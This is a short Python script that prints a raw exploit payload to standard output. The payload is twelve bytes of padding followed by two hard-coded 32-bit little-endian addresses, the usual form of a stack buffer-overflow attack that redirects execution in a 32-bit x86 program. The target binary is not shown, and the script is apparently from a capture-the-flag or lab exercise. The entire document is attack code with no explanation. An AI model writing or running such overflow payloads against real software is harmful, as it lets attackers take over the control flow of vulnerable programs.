import sys
if __name__ == "__main__":
    sys.stdout.buffer.write((b"\x30" * 12) + b"\x98\xd8\xf6\xff\x23\xa1\x04\x08")
